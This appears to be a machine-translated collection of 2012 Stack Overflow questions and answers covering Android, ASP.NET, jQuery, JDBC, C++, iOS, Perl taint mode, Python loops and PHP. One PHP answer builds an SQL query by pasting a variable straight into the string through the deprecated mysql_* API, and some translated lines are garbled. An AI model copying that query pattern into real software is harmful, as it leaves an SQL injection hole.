您的**默认链接**是[http://tinkerbin.com/ob9HFOA4](http://tinkerbin.com/ob9HFOA4)

**CSS**

```
 img{
   display: inline-block;
    vertical-align: top;
    } 
```

现场演示[http://tinkerbin.com/a5BxIZrs](http://tinkerbin.com/a5BxIZrs)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-03T18:49:19.927

首先，为了不弄乱您可能要添加的其他图像，请执行以下操作：

```
.Wrapper img{ float: left; } 
```

这会将 .Wrapper 类中的所有图像浮动到左侧。如果调用这些 css 规则的页面中的所有图像都将左对齐，请执行以下操作：

```
.Wrapper img{ float: left; } 
```

**编辑：**将此规则添加到 .Wrapper

```
.Wrapper{ width: 100%; } 
```

# android - 在微调器中设置所选项目

> ID：11309305
> 
> 赞同：0
> 
> 时间：2012-07-03T10:47:03.883
> 
> 标签：android, spinner, adapter

我正在做一个 android 应用程序并显示列出数据的详细视图，我需要设置微调器的选定项目。我该如何设置？

我是android开发领域的新手..任何人都可以帮助我

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-03T10:58:35.600

使用widget类的`setSelection(...)`方法，`Spinner`可以设置选中项的位置。

例如：

```
spinner.setSelection(position); 
```

# c# - 在 ASP.net 中的线程后显示消息框

> ID：11309308
> 
> 赞同：0
> 
> 时间：2012-07-03T10:47:18.310
> 
> 标签：c#, asp.net, multithreading, message

我是 .Net 的新手。请帮助我。
我的 aspx 页面中有一个按钮和一个标签，我想在标签中显示文本，几秒钟后我想在按钮单击时显示消息框。我的代码是 -

```
<asp:UpdatePanel ID="UpdatePanel1" runat="server" UpdateMode="Conditional">
<ContentTemplate>
<asp:Label ID="lblFirst" runat="server" Text=""></asp:Label> 
<asp:Button ID="btnClick" runat="server" Text="MyThread" 
       onclick="btnClick_Click" />
</ContentTemplate>
</asp:UpdatePanel> 
```

和**代码文件-**

```
protected void btnClick_Click(object sender, EventArgs e)
    {
        lblFirst.Text = "Thread Start!";

        Thread threadObj = new Thread(new ThreadStart(myThreadMethod));
        threadObj.Start();
    }

    public void myThreadMethod()
    {
        //Server Code that take long time..
        Debug.Write("Thread Ending");
        Page.ClientScript.RegisterStartupScript(GetType(),"msgbox","alert('End');",true);

    } 
```

我得到了标签的文本更改但未显示消息框。
是否可以在线程之后显示消息框？
我怎样才能做到这一点？
感谢您的关注和回复。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T10:50:39.823

使用后台工作人员，然后添加事件 BackGroundWorker 完成，在该事件中，您添加您的消息框

```
 BackgroundWorker bgw = new BackgroundWorker();

    // setup the anonymous event, this fires when the thread starts
    bgw.DoWork += (sender, e) =>
    {
        // do work here
    };

    // event when the thread has finished
    bgw.RunWorkerCompleted += new RunWorkerCompletedEventHandler((sender, e) =>
    {
        // set yr messagebox here
    }); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-03T13:23:42.173

您可以使用`System.Threading.Thread.Sleep(x);`
Replace x by time（以毫秒为单位）。
在此之后，您可以使用`Button1.PerformClick();`
其中 Button1 是按钮的名称。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-03T11:22:01.670

@Nyein Nyein Chan Chan：

```
 Response.Write("<script language='javascript'>alert('Your message is here.')</script>"); 
```

# android - 地理编码不返回任何值

> ID：11309309
> 
> 赞同：3
> 
> 时间：2012-07-03T10:47:31.477
> 
> 标签：android

我正在尝试将地址转换为 long 和 lat，但它返回 0。请告诉我我做错了什么。这是我的代码：

```
geocoder = new Geocoder(this);  
buttonSave.setOnClickListener(new OnClickListener() {
    @Override
    public void onClick(View v) {    
        try {
            EditText loc = (EditText)findViewById(R.id.txtAddress);
            String locationName = loc.getText().toString();             
            List<Address> addressList = geocoder.getFromLocationName(locationName, 2);              
            if(addressList!=null && addressList.size()>0) {
                lat = (int)(addressList.get(0).getLatitude()*1000000);
                lng = (int)(addressList.get(0).getLongitude()*1000000);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        lattitude = Integer.toString(lat);          
        longertude = Integer.toString(lng); 
```

我的日志：

```
07-03 13:44:28.799: I/System.out(274): [INFO:19529614]: LogSource: Running flush
07-03 13:44:28.799: I/System.out(274): [INFO:19529623]: LogSource: Sending payload [bytes=267]
07-03 13:44:32.262: D/SntpClient(83): request time failed: java.net.SocketException: Address family not supported by protocol
07-03 13:44:33.809: I/System.out(274): [INFO:19534623]: LogSource: Running delayed flush
07-03 13:44:33.809: W/System.err(2517): java.io.IOException: Unable to parse response from server
07-03 13:44:33.823: I/System.out(274): [INFO:19534640]: LogSource: Running flush
07-03 13:44:33.829: I/System.out(274): [INFO:19534651]: LogSource: Sending payload [bytes=267]
07-03 13:44:33.869: W/System.err(2517):     at android.location.Geocoder.getFromLocationName(Geocoder.java:178)
07-03 13:44:33.869: W/System.err(2517):     at de.vogella.android.locationapi.simple.InsertStock$1.onClick(InsertStock.java:108)
07-03 13:44:33.879: W/System.err(2517):     at android.view.View.performClick(View.java:3110)
07-03 13:44:33.891: W/System.err(2517):     at android.view.View$PerformClick.run(View.java:11928)
07-03 13:44:33.899: W/System.err(2517):     at android.os.Handler.handleCallback(Handler.java:587)
07-03 13:44:33.899: W/System.err(2517):     at android.os.Handler.dispatchMessage(Handler.java:92)
07-03 13:44:33.899: W/System.err(2517):     at android.os.Looper.loop(Looper.java:132)
07-03 13:44:33.913: W/System.err(2517):     at android.app.ActivityThread.main(ActivityThread.java:4025)
07-03 13:44:33.919: W/System.err(2517):     at java.lang.reflect.Method.invokeNative(Native Method)
07-03 13:44:33.939: W/System.err(2517):     at java.lang.reflect.Method.invoke(Method.java:491)
07-03 13:44:33.939: W/System.err(2517):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:841)
07-03 13:44:33.939: W/System.err(2517):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:599)
07-03 13:44:33.939: W/System.err(2517):     at dalvik.system.NativeStart.main(Native Method) 
```

但是没有错误（红字）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-06T13:29:13.087

我刚刚将 locationName 编号更改为 2

```
try 
        {
            address = coder.getFromLocationName(searchedAddress,**2**);
            if (address == null) {
                Log.d(TAG, "############Address not correct #########");
            } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-03T10:50:06.757

您可以使用它从地址获取经纬度：

```
 public String getLatitudeAndLongitudeFromGoogleMapForAddress(String searchedAddress){

        Geocoder coder = new Geocoder(this);
        List<Address> address;
        try 
        {
            address = coder.getFromLocationName(searchedAddress,5);
            if (address == null) {
                Log.d(TAG, "############Address not correct #########");
            }
            Address location = address.get(0);

            Log.d(TAG, "Address Latitude : "+ location.getLatitude() + "Address Longitude : "+ location.getLongitude());

            for(int i = 0; i<address.size();i++)
            {
                 Address location2 = address.get(i);
            Log.d(TAG, "Address  : "+ location2.getAddressLine(0));
            }

            return "lat="+ location.getLatitude() +"&long="+ location.getLongitude();

        }
        catch(Exception e)
        {
            Log.d(TAG, "MY_ERROR : ############Address Not Found");
            return "ERROR";
        }
    } 
```

如果你在 Android Emulator 中绑定它，那么它将无法工作：这是[2.2 的模拟器中的一个错误](http://code.google.com/p/android/issues/detail?id=8816)

# javascript - 单选按钮列表列表 - 只允许选择一个

> ID：11309313
> 
> 赞同：0
> 
> 时间：2012-07-03T10:47:38.437
> 
> 标签：javascript, jquery, html

我在 fieldset 标记中有多个单选按钮列表。

我只希望可以从整个列表中选择一项...目前我可以从每个单选按钮列表中选择一项 - 这是正常的

我知道这样做的正确方法是拥有一个长单选按钮列表，但这不是一种选择。

javascript/jquery 中有没有给定字段集类名的方法 - 比如说

`<fieldset class="mylistofradiolists">`当其中的单选按钮被选中时，所有其他项目都被**取消选择**，只有那个单选按钮**保持选中状态**

谢谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-03T10:52:43.957

您可以使用以下代码执行此操作

```
$radios =  $('.mylistofradiolists :radio');
$radios.on('change',function(){
   $radios.not(this).prop('checked',false);
}); 
```

当一个收音机被选中时，除了在该容器中被取消选择的所有其他收音机。

最好用

```
$radios =  $('.mylistofradiolists [type=radio]'); 
```

代替

```
$radios =  $('.mylistofradiolists :radio'); 
```

正如选择器的文档[`:radio`](http://api.jquery.com/radio-selector/)所说

> 因为 :radio 是一个 jQuery 扩展而不是 CSS 规范的一部分，所以使用 :radio 的查询不能利用原生 DOM querySelectorAll() 方法提供的性能提升。
> 
> **为了在现代浏览器中获得更好的性能，请改用 [type="radio"]** 。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-07-03T10:59:11.943

通过保持单选按钮的每个“名称”属性相同，您可以实现从由字段集标记分隔的单选按钮列表中仅选择一个单选按钮的功能。

例如： - 对于第一个字段集 - 保持单选按钮名称字段相同。

```
<fieldset >
<input type="radio" name="food" /> : Italian<br />
<input type="radio" name="food" /> : Greek<br />
<input type="radio" name="food" /> : Chinese<br />
<fieldset > 
```

对于第二个字段集，保持名称属性相同：-

```
<fieldset >
<input type="radio" name="food" /> : Indian<br />
<input type="radio" name="food" /> : UK<br />
<fieldset > 
```

希望这个分析器用户问题:)

# java - 关于 addBatch(String) 的注意事项

> ID：11309317
> 
> 赞同：3
> 
> 时间：2012-07-03T10:47:54.177
> 
> 标签：java, jdbc, prepared-statement

`addBatch()`类中的方法旁边`PreparedStatement`还有一个`addBatch(String)`方法`Statement`。

我想处理一系列不同的 sql 语句，并正在寻找一些关于 addBatch(String) 意味着性能方面的说明。使用此方法是否安全（且快速），或者将类似的 sql 语句在 Java 中分组并分组执行是否更好？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-03T11:27:53.947

批处理允许您将相关的 SQL 语句分组到一个批处理中，并通过一次调用数据库来提交它们。

一次向数据库发送多个 SQL 语句时，可以减少通信开销，从而提高性能。

`addBatch(String sql)`被定义在接口中`java.sql.Statement`并且`addBatch()`被定义在`java.sql.PreparedStatement`是子接口之一`extends Statement`。（其他是`java.sql.CallableStatement`）

根据[JAVA 文档](http://download.java.net/jdk7/archive/b123/docs/api/java/sql/Statement.html#addBatch%28java.lang.String%29)

`addbatch(String sql)`不能在`PreparedStatement`or`CallableStatement`和 sql 上调用方法 - 通常这是 SQL`INSERT`或`UPDATE`语句。

`addBatch()`如果您想要批量插入或批量更新操作，则首选。

批处理执行的阻塞因素很少

```
DB make/version.
JDBC driver make/version. 
```

例如：如果您使用的是 MySQL，请使用最新的驱动程序将**rewriteBatchedStatements=true**添加到您的连接字符串以使 statement.addBatch() 实际创建批量插入。

此外，您应该确保自动提交是错误的。维护一个计数器，当 Java 中的可用堆内存受到限制时，该计数器会到达该计数器 executeBatch。

例子：

```
conn.setAutoCommit(false);  
PreparedStatement pStmt = conn.prepareStatement("INSERT INTO mytable (field1,field2) VALUES (?,?)");

for all values:
  pStmt.setString(1,val1);
  pStmt.setString(2,val2);
  pStmt.addBatch();    
  if ( i % 1000 == 0) {  
            pstmt.executeBatch();// Execute every 1000 items  
  } 
pstmt.executeBatch(); 
conn.commit(); 
```

# c++ - C++ 特殊字符

> ID：11309320
> 
> 赞同：2
> 
> 时间：2012-07-03T10:48:09.730
> 
> 标签：c++, character-encoding, internationalization

我有以下问题

```
#include <iostream>
#include <stdio.h>
#include <string.h>

int main (){
   string data = "\xd7\x91\xd7\x90" ; 

   data << data<<endl;
} 
```

输出是：בא

但是有输入。

```
#include <iostream>
#include <stdio.h>
#include <string.h>

int main (){
    char rrr[100];
    cout << "Please enter your string:" ;   
    scanf("%s",rrr);

    cout<< rrr <<endl;
} 
```

我输入的输入是：`\xd7\x91\xd7\x90`

我在屏幕上看到的输出是：`\xd7\x91\xd7\x90`

所以我的问题是如何将输入转换`\xd7\x91\xd7\x90`为`בא`？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-03T10:56:23.583

您可以更改您的 scanf 语句：

```
int a, b, c, d;
if (scanf("\\x%x\\x%x\\x%x\\x%x", &a, &b, &c, &d) == 4)
    // a, b, & c have been read/parsed successfully...
    std::cout << (char)a << (char)b << (char)c << (char)d << '\n'; 
```

尽管如此，最好还是学习以十六进制值进行流式传输：

```
char backslash, x;
char c;

while (std::cin >> backslash >> x >> std::hex >> c && backslash == '\\' && x == 'x')
    // or "for (int i = 0; i < 4 && std::cin >> ...; ++i)" if you only want four
    std::cout << c; 
```

# objective-c - iOS 核心动画加速

> ID：11309322
> 
> 赞同：0
> 
> 时间：2012-07-03T10:48:14.270
> 
> 标签：objective-c, ios, ios5, core-animation, transition

我正在尝试使用不同的动画将一个复杂视图替换为另一个复杂视图，例如移动到左/右/上/下。第一个和第二个视图包含 30-40 个子视图（按钮）。我的代码是这样的：

```
oldView.alpha = 1;
newView.alpha = 0;
oldView.frame = CGRectMake(0, 0, width, height);
newView.frame = CGRectMake(0, -height, width, height);

// begin animation
// setting duration 0.3
// ...

oldView.alpha = 0;
newView.alpha = 1;
oldView.frame = CGRectMake(0, height, width, height);
newView.frame = CGRectMake(0, 0, width, height);

// commit animation
// ... 
```

它在*iPhone Simulator*和*iPhone 4S*上运行良好，但在*iPhone 4*上运行滞后。延迟是指 12-15 FPS。

我怎样才能加快这个动画？

*   我应该使用`center`property 而不是`frame`？
*   我应该将我的观点渲染为`UIImageView`'s 并为其设置动画吗？
*   我应该布局我的视图`UIScrollView`并打电话`scrollRectToVisible:animated:`吗？

请解释一下为什么我的动画代码这么慢？当我的两个视图包含 10-20 个按钮时 - 速度没有问题......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T11:20:20.773

尝试以下方法之一：

*   改变中心而不是框架
*   使用变换属性而不是框架。`oldView.transform = CGAffineTransformMakeTranslation(0, height);`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-03T10:56:40.443

您将需要发布更多代码，因为设置新框架不应该对性能造成太大影响。但是，您可以对视图`layer`或在视图中做一些事情，`drawRect:`这会大大减慢绘图和动画的速度。

例如：

```
myView.layer.shadowOffset = CGSizeMake(0.0, 10.0);
myView.layer.shadowRadius = 10;
myView.layer.shadowOpacity = 0.40; 
```

给视图添加一个漂亮的阴影会杀死动画。所以在这种情况下，我在制作动画时关闭阴影，完成后再次打开。

如果不查看更多代码，就不可能说出问题出在哪里。

**编辑：**

要加快阴影的渲染，您可以将`shouldRasterize`属性设置为`YES`. 这会强制图层创建阴影的位图，而不是每帧都尝试重绘它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-04T12:59:10.420

补充一点，如果您正在使用显式动画但仍设置动画属性，您将需要使用以下方法禁用隐式动画：

```
[CATransaction setValue:(id)kCFBooleanTrue forKey:kCATransactionDisableActions]; 
```

# html - 光标位于 iFrame 区域时不滚动 (Firefox)

> ID：11309323
> 
> 赞同：2
> 
> 时间：2012-07-03T10:48:14.830
> 
> 标签：html, css, firefox, iframe

我有一个居中 iframe 的网站，它具有固定的高度和宽度。所以你不能在 iframe 内滚动，但你可以滚动整个边。

*问题：*当我想滚动整个边，但我的鼠标悬停在 iframe 的区域上时，它不起作用。我必须将鼠标移到一边，使其不再位于 iframe 上方。我只在 Firefox 中遇到这个问题。

iFrame 的 CSS，body 滚动是标准的：

```
.frame{
    width:1024px;
    height:768px;
    top:50%;
    margin-top:-384px;
    border:0;
    z-index:1;
    overflow:hidden;
    position:absolute;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-03T11:46:20.583

Remove your CSS `overflow` property.

```
.frame{
    width: 1024px;
    height: 768px;
    top: 50%;
    margin-top: -384px;
    border: 0;
    z-index: 1;
    overflow: scroll; /* not necessary */
    position: absolute;
} 
```

# java - 我怎样才能知道我的字符串包含变音符号？

> ID：11309324
> 
> 赞同：9
> 
> 时间：2012-07-03T10:48:18.610
> 
> 标签：java, character-encoding

例如 -

```
text = Československá obchodní banka;

text string contains diacritics like Č , á etc. 
```

我想写一个函数，我将传递这个字符串“Československá obchodní banka”和 `function will return true if string contains diacritics else false`.

我必须分别处理包含不属于 Az 或 az 范围的字符的变音符号和字符串。

```
1) If String contains diacritics then I have to do some XXXXXX on it.

2) If String contains character other than A-Z or a-z and not contains diacritics  then do some other operations YYYYY. 
```

我不知道该怎么做。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-07-03T11:16:54.170

一条知识：在 Unicode 中存在一个代码，但使用 an和 a`á`可能会得到相同的结果。`a``combining mark-'`

您可以使用[java.text.Normalizer](http://docs.oracle.com/javase/7/docs/api/java/text/Normalizer.html)，如下所示：

```
public static boolean hasDiacritics(String s) {
    // Decompose any á into a and combining-'.
    String s2 = Normalizer.normalize(s, Normalizer.Form.NFD);
    return s2.matches("(?s).*\\p{InCombiningDiacriticalMarks}.*");
    //return !s2.equals(s);
} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-07-03T11:16:24.260

[Normalizer](http://docs.oracle.com/javase/6/docs/api/java/text/Normalizer.html)类似乎能够做到这一点。一些有限的测试表明

```
Normalizer.isNormalized(text, Normalizer.Form.NFD) 
```

可能是你需要的。

# php - 在 php 中创建一个 zip 文件而不使用 ziparchive

> ID：11309328
> 
> 赞同：9
> 
> 时间：2012-07-03T10:48:35.180
> 
> 标签：php, zip

我正在尝试在 PHP 中创建一个 zip 文件。

服务器环境是有限的，所以我不能使用[ziparchive](http://bd.php.net/manual/en/class.ziparchive.php)扩展`exec`，shell 命令也不能。

是否有一个纯 php 解决方案可以让我创建 .zip 档案？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-07-03T11:23:09.003

还有 PCLZip，它是 ZipArchive 的纯 PHP 替代品，可在[http://www.phpconcept.net/pclzip/找到](http://www.phpconcept.net/pclzip/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-03T10:53:48.513

服务器上肯定存在什么？如果它是一台 Unix 机器，你也许可以执行一个 shell 命令？`shell_exec('zip ...')`

# android - 如何拆分句子并将其保存在不同的数组中？

> ID：11309332
> 
> 赞同：-3
> 
> 时间：2012-07-03T10:48:47.500
> 
> 标签：android

我有一个 rss 提要，我需要在其中获取描述数据并将其保存在一个数组中。但在我的 rss 提要中，我有图像和描述。我如何拆分它们并保存在单独的数组中。图像数组和描述离子描述数组中的一个。

以下是来自 rss 提要的描述标签：

`<img src='http://static.ibnlive.in.com/ibnlive/pix/sitepix/04_2010/3g-mobile_0904_630_90x62.jpg'>`

电信争议这个角色是为她量身定做的，“Billa”和“Yei”女孩说，如果她得到这个角色，她甚至准备降低她的报酬。

你们中的任何人都可以帮助我吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T10:53:19.073

您可以在java中使用正则表达式将字符串分成两部分。

`split`使用带有所需[正则表达式](http://java.sun.com/developer/technicalArticles/releases/1.4regex/)的字符串函数作为参数，或者编写自己的函数`pattern matching algorithm`来执行相同的操作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-03T11:03:26.040

我认为您可以使用[AndroidRssReader](https://github.com/robhinds/AndroidRssReader)项目来解析来自 RSS 提要的必要信息

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-03T11:04:25.937

```
 String x="Ask on stackoverflow";
    String[] tokens=x.split(" ");
    for(String t:tokens){
        System.err.println(t);
    } 
```

输出

```
 Ask
           on
           stackoverflow 
```

# perl - 为什么 Perl 在 -T 下运行时不想要求某些文件？

> ID：11309340
> 
> 赞同：4
> 
> 时间：2012-07-03T10:49:33.047
> 
> 标签：perl, require, taint

`require 'lib/file.pl'`我最近注意到在我的系统上运行时是不可能的`-T`，但是`require './lib/file.pl'`可以。

```
$ perl -wT -e 'require "lib/file.pl";'
Can't locate lib/file.pl in @INC (@INC contains: /usr/lib/perl5/site_perl/5.14.2/x86_64-linux-thread-multi /usr/lib/perl5/site_perl/5.14.2 /usr/lib/perl5/vendor_perl/5.14.2/x86_64-linux-thread-multi /usr/lib/perl5/vendor_perl/5.14.2 /usr/lib/perl5/5.14.2/x86_64-linux-thread-multi /usr/lib/perl5/5.14.2 /usr/lib/perl5/site_perl/5.14.2/x86_64-linux-thread-multi /usr/lib/perl5/site_perl/5.14.2 /usr/lib/perl5/site_perl)

$ perl -wT -e 'require "lib/file.pl"' 
```

这样做没有`-T`两种方式： $ perl -w -e 'require "lib/file.pl"' $ perl -w -e 'require "./lib/file.pl"'

在污点模式下，`.`不是`@INC`.

```
perl -w -e 'print "@INC"'
[..snip..] /usr/lib/perl5/site_perl/5.14.2 /usr/lib/perl5/site_perl .
perl -wT -e 'print "@INC"'
[..snip..] /usr/lib/perl5/site_perl/5.14.2 /usr/lib/perl5/site_perl 
```

我在文档中找不到这种行为。有人可以告诉我这是在哪里记录的，或者为什么`-T`不喜欢`.`作为 lib 目录？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-07-03T10:53:41.593

嗯...这实际上是[有据可查](http://perldoc.perl.org/perlsec.html#Taint-mode-and-@INC)的，我想：

> 当污点模式 (-T) 生效时，“.” 目录从 @INC 中删除，环境变量 PERL5LIB 和 PERLLIB 被 Perl 忽略。您仍然可以使用 -I 命令行选项从程序外部调整 @INC，如 perlrun 中所述。

...但我想这只是答案的一半。[此处](http://gunther.web66.com/FAQS/taintmode.html#require)给出了此类决定背后的原因：

> ...@INC 的问题实际上是 SUID 脚本的问题，而不是 CGI 脚本的问题。当你有一个 SUID 脚本可以以另一个用户（例如 root）的权限执行时，Perl 会自动进入 taintmode。
> 
> 对于这个 SUID 脚本案例，具有从用户当前目录加载库的能力将是一个巨大的安全漏洞。如果脚本最终出现在正常目录路径中找不到库的错误，则用户可以通过编写自己的恶意版本的库，将其放在当前目录中并运行 SUID 脚本来利用此漏洞他们的当前目录。
> 
> 然而，这与 CGI 脚本的问题并不完全相同。用户没有从任意目录执行您的脚本。您的 Web 服务器控制从哪个目录调用脚本。所以保留“。” 与在污点模式下自动运行的 SUID 脚本相比，@INC 并不是真正的问题。

# python - while循环和python

> ID：11309346
> 
> 赞同：1
> 
> 时间：2012-07-03T10:49:57.297
> 
> 标签：python, performance, while-loop, infinite-loop

> **可能重复：**
> [为什么要避免 while 循环？](https://stackoverflow.com/questions/4270167/why-avoid-while-loops)

我正在尝试通过[学习 Python The Hard Way](http://learnpythonthehardway.org)来学习 Python ，随着我的进步，我发现它在网站上提到，

> 仅使用 while 循环来永远循环，这意味着可能永远不会。这仅适用于 Python，其他语言不同。

现在我基本上是一名 Java 开发人员，这让我想知道为什么`while`在 python 中应该避免使用它，尽管它在 Java 中被广泛使用。我一直无法在互联网上找到任何答案。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-03T10:54:29.840

这种说法是非常主观的，我不确定我是否同意。`while`在 Python 中使用无限循环很容易：

```
 while True:
       # do stuff 
```

也许作者将其与 C 进行比较，C 中也很容易使用 for 进行无限循环：

```
 for(;;)
      /* do stuff */ 
```

对于 Python，真正不存在这样的相应构造。

话虽如此，有很多情况下无限循环很有用（在任何语言中） - 想想事件循环，或者可以通过无限循环来简化循环控制并且只有某些条件会导致`break`.

您经常会处理诸如列表和字符串之类的序列，并且使用 for 循环将是一个自然的选择，但我不会仅仅因为这个而忽略 while 循环。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-03T10:58:48.433

他在[练习 33](http://learnpythonthehardway.org/book/ex33.html)中说：

> 这是while循环的问题：有时它们不会停止。

如果您知道自己在做什么，这并不是真正的 Python 问题。;)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-03T11:10:40.860

`for`当您想要迭代一定次数时，它几乎是 Python 中的“默认”选择。例如：

```
for i in xrange(10):
    #do stuff
    #iterates 10 times

for an_element in a_collection:
    #do stuff
    #iterates over every element in a collection
    #though generators can be "infinite" 
```

但是，如果您想*无限*次循环代码，则`while`循环更为惯用。

```
while a_boolean: 
    #do stuff
    #iterates as long as a_boolean evaluates to True

while True:
    #do stuff
    #iterates till a break is encountered 
```

由于您来自 Java 背景，`while`因此 Python 中的循环与 Java 中的循环几乎相同，`while`并且使用方式也几乎相同。Python 中的`for`循环类似于：

```
 for(Integer i : anArrayListOfIntegers){
     //do stuff
 } 
```

`for(int i=0;i<10;i++)`Python 中不存在该表单，而是使用`range()/xrange()`第一个示例中的表单。也就是说，除了列表推导/生成器表达式等情况外，每个`for`循环都可以替换为等效循环。`while`

就速度或内存使用而言，这样做没有真正的优点或缺点。然而，Python 程序员倾向于`for`在迭代集合时使用，以及`while`当他们想要在条件为真*时*或*直到*条件为真时进行迭代。如果你坚持这个一般的经验法则，你可能不会出错。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-03T10:59:41.177

学习 Python The Hard Way 相当固执己见，所以我不认为这意味着你永远不应该使用`while`. 我最好的猜测是，因为迭代器是 Python 中普遍存在的模式，所以大多数实际迭代都可以使用`for..in`. Java 有使用的旧`Iterator`模式`while (it.hasNext()) { … }`，或类似的读取 JDBC`ResultSet`或从标准输入读取行的模式——所有这些都可以用`for..in`Python 中的 a 来实现。（可行并且可以说应该这样做；`for..in`更具可读性，并且`yield`可以轻松编写常规可迭代对象，因此库没有理由不公开迭代器 API。）

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-07-03T10:56:54.160

没有什么鬼主意。事实上，`while`它是 Python 中唯一的“经典”循环方式，因为`for`它与`foreach`其他语言中的类似（即遍历集合或迭代器的运算符）。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-07-03T10:57:18.683

Python中的循环没有任何问题，`while`当您不处理可迭代对象时，它就占有一席之地。

但是如果你正在处理一个可迭代的（并且这个概念在 Python 中非常普遍），`for`循环总是更好的构造。

例如，在许多语言中，您会编写如下内容：

```
while(! file.EOF) {
    ...
} 
```

在 Python 中，您使用：

```
for line in file:
    do_something_with(line) 
```

# oracle - 使用非原子刷新创建物化视图？

> ID：11309348
> 
> 赞同：3
> 
> 时间：2012-07-03T10:50:07.700
> 
> 标签：oracle, materialized-views

根据文档，物化视图的非原子刷新在完全刷新中使用截断而不是删除。有没有办法说 oracle 在创建物化视图时使用 truncate 而不是 delete ？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-03T10:55:32.817

没有我知道的方法-您必须使用 atomic => false 显式调用 dbms_mview.refresh：

```
begin
  dbms_mview.refresh( 'EMP_MV' , atomic_refresh => FALSE );
end; 
```

**编辑：**除非您使用的是 Oracle 9.2 或更早版本 - 这些版本默认执行非原子刷新。

# php - 我将如何在我的 php 页面中打印总行数

> ID：11309356
> 
> 赞同：-5
> 
> 时间：2012-07-03T10:50:24.383
> 
> 标签：php, mysql

我写了一个这样的查询：

```
$countcatid="SELECT COUNT(*) AS NumberOfcount FROM pop_sub_sub where cat_id ='$catid'";
$rs_count=mysql_query($countcatid) or die(mysql_error());
$row_count=mysql_num_rows($rs_count); 
```

如何在我的 PHP 页面中打印总数？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T10:56:06.670

如果您想根据条件打印查询获取的行数。

```
<?php
  $countcatid="SELECT * FROM pop_sub_sub where cat_id ='$catid'";
  $rs_count=mysql_query($countcatid) or die(mysql_error());
  $row_count=mysql_num_rows($rs_count);
  echo $row_count;
?> 
```

或者，如果您想从查询`echo`中`count`获取 as 列。

```
<?php
  $countcatid="SELECT COUNT(*) AS NumberOfcount FROM pop_sub_sub 
  where cat_id ='$catid'";
  $rs_count=mysql_query($countcatid) or die(mysql_error());
  $result = mysql_fetch_assoc($result);
  echo $result['NumberOfcount'];
?> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-03T10:55:57.763

您可以使用 PHP 的[`mysql_result()`](http://www.php.net/manual/en/function.mysql-result.php)函数来检索存储在 MySQL 结果集中第一条记录的第一个字段中的计数：

```
echo mysql_result($rs_count, 0); 
```

但是，如手册中所述：

> 不鼓励使用此扩展程序。相反，应该使用[MySQLi](http://www.php.net/manual/en/book.mysqli.php)或[PDO_MySQL扩展。](http://www.php.net/manual/en/ref.pdo-mysql.php)另请参阅[MySQL：选择 API](http://www.php.net/manual/en/mysqlinfo.api.choosing.php)指南和[相关的常见问题解答](http://www.php.net/manual/en/faq.databases.php#faq.databases.mysql.deprecated)以获取更多信息。

# qt - 如何用 Phonon 播放音频 CD？

> ID：11309358
> 
> 赞同：0
> 
> 时间：2012-07-03T10:50:35.213
> 
> 标签：qt, phonon, cd-rom

我正在尝试在 Windows 下使用 phonon 播放音频 CD。我使用 Qt 4.8.0。

我运行如下代码：

```
QString filepath = QString("E:\\")
myMusic = Phonon::createPlayer(Phonon::MusicCategory, Phonon::MediaSource(Phonon::Cd, filepath));
myMusic->play(); 
```

日志窗口中有任何错误，也有任何声音。磁盘也不会在驱动器中旋转。

那么是否可以选择使用声子播放音频 CD？如果是，我该如何选择正确的轨道？

PS MP3 播放没有问题

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-06T19:39:05.703

好的，我想我已经解决了这个问题。目前我有这样的代码：

```
Phonon::MediaObject *myMusic = Phonon::createPlayer(Phonon::MusicCategory,Phonon::MediaSource Phonon::Cd, QString("E:\\")));
Phonon::MediaController myMediaController(myMusic);
myMediaController.setAutoplayTitles(true);
myMediaController.setCurrentTitle(7);
myMusic->play(); 
```

“E:\”是我插入音频 CD 的 CD 驱动器，我播放第 8 首曲目（曲目计数从零开始）。

我的 Windows 7 系统上的其他问题是声子警告：

```
unable to load the TOC from the CD 
```

此问题与 Phonon Windows 后端有关。一些 Windows 系统没有安装 CDDA 编解​​码器（或那是什么）。在这种情况下，Phonon 应用程序将不会播放音频 CD 光盘。您不会看到任何错误（上述错误除外），也不会有任何 cd 驱动器活动。

要解决此问题，您应该：

1.  为您的系统下载适当的 cddareader.ax（我使用了来自[http://sourceforge.net/projects/mpc-hc/files/](http://sourceforge.net/projects/mpc-hc/files/)上的 MPC HomeCinema Standalone Filters 的一个）
